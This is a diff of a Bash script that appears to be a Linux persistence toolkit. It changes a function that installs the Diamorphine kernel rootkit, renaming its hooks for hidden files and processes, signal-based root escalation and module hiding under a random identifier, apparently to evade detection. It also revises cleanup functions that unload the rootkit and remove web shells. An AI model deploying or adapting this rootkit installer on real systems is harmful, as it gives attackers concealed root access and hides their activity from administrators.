@@ -4953,9 +4953,9 @@ setup_rootkit() {
 		exit 1
 	fi
 
-    echo "[!] There are known issues with the Diamorphine rootkit for Ubuntu 22.04"
-    echo "[!] This module is tested on Debian 11, 12, RHEL 9, CentOS Stream 9 and CentOS 7"
-    echo "[!] I cannot guarantee that it will work on other distributions"
+    echo "[!] There are known issues with the Diamorphine rootkit for Ubuntu 22.04."
+    echo "[!] This module is tested on Debian 11, 12, RHEL 9, CentOS Stream 9 and CentOS 7."
+    echo "[!] I cannot guarantee that it will work on other distributions."
     sleep 5
 
     mkdir -p $rk_path
@@ -5023,16 +5023,16 @@ setup_rootkit() {
 	sed -i s/diamorphine.o/${identifier}.o/g ${rk_path}/Makefile
 	
 	# Original functions
-	sed -i s/orig_getdents/${identifier}_orig_getdents/g ${rk_path}/${identifier}.c
 	sed -i s/orig_getdents64/${identifier}_orig_getdents64/g ${rk_path}/${identifier}.c
+	sed -i s/orig_getdents/${identifier}_orig_getdents/g ${rk_path}/${identifier}.c
 	sed -i s/orig_kill/${identifier}_orig_kill/g ${rk_path}/${identifier}.c
 	
 	# Hooks
 	sed -i s/module_hide/${identifier}_module_hide/g ${rk_path}/${identifier}.c
 	sed -i s/module_hidden/${identifier}_module_hidden/g ${rk_path}/${identifier}.c
 	sed -i s/is_invisible/${identifier}_invisible/g ${rk_path}/${identifier}.c
-	sed -i s/hacked_getdents/${identifier}_getdents/g ${rk_path}/${identifier}.c
 	sed -i s/hacked_getdents64/${identifier}_getdents64/g ${rk_path}/${identifier}.c
+	sed -i s/hacked_getdents/${identifier}_getdents/g ${rk_path}/${identifier}.c
 	sed -i s/hacked_kill/${identifier}_kill/g ${rk_path}/${identifier}.c
 	sed -i s/give_root/${identifier}_give_root/g ${rk_path}/${identifier}.c
 	sed -i s/is_invisible/${identifier}_is_invisible/g ${rk_path}/${identifier}.c
@@ -5057,6 +5057,7 @@ setup_rootkit() {
 	fi
 
 	make -C ${rk_path} clean
+    touch ${rk_path}/restore_${identifier}.ko
 
 	echo "[+] Diamorphine rootkit has been installed."
     echo "[+] The secret is: ${secret}"
@@ -5119,9 +5120,9 @@ revert_rootkit() {
 	# Function to unload a kernel module
 	unload_kernel_module() {
 		local module_name="$1"
-		if lsmod | grep -q "^${module_name}\b"; then
+		if /sbin/lsmod | grep -q "^${module_name}\b"; then
 			echo "[+] Unloading kernel module: $module_name"
-			rmmod -f "$module_name"
+			/sbin/rmmod -f "$module_name"
 			if [[ $? -eq 0 ]]; then
 				echo "[+] Kernel module '$module_name' unloaded successfully."
 			else
@@ -5141,16 +5142,22 @@ revert_rootkit() {
 		# Step 2: Identify and unload kernel modules
 		echo "[+] Identifying loaded rootkit kernel modules in $rk_path..."
 
-		# Find all .ko files in rk_path
-		ko_files=("$rk_path"/*.ko)
+		# Find rootkit name
+		rk_name=/dev/shm/.rk/restore_*.ko
+		rk_name=$(echo $rk_name | sed 's/restore_//g')
+		rk_name=$(basename $rk_name .ko)
 
-		if [[ ! -e "${ko_files[0]}" ]]; then
-			echo "[-] No .ko files found in $rk_path."
+		# If rootkit was found, unload it, else, return
+		if [[ -z "$rk_name" ]]; then
+			echo "[-] Rootkit not found."
 		else
-			for ko_file in "${ko_files[@]}"; do
-				module_name=$(basename "$ko_file" .ko)
-				unload_kernel_module "$module_name"
-			done
+			echo "[+] Unloading rootkit $rk_name..."
+			unload_kernel_module "$rk_name"
+			if [[ $? -eq 0 ]]; then
+				echo "[+] Rootkit $rk_name unloaded successfully."
+			else
+				echo "[-] Failed to unload rootkit $rk_name."
+			fi
 		fi
 	else
 		echo "[-] Rootkit directory '$rk_path' not found. Skipping module unloading."
@@ -5178,7 +5185,7 @@ revert_rootkit() {
 
 	# Step 6: Reload kernel modules to ensure no remnants remain
 	echo "[+] Reloading kernel modules..."
-	depmod -a
+	/sbin/depmod -a
 	if [[ $? -eq 0 ]]; then
 		echo "[+] Kernel modules reloaded successfully."
 	else
@@ -7121,7 +7128,7 @@ revert_web_shell() {
         return 0
     fi
 
-    # Define system users to skip (modify this array if certain users should not be processed)
+    # Define system users to skip
     system_users=("root" "daemon" "bin" "sys" "sync" "games" "man" "lp" "mail" "news" "uucp" "proxy" "www-data" "backup" "list" "irc" "gnats" "nobody" "systemd-network" "systemd-resolve" "syslog" "messagebus" "uuidd" "dnsmasq" "usbmux" "rtkit" "cups-pk-helper" "dnsmasq-dhcp" "sshd" "polkitd")
 
     # Function to check if a user is a system user
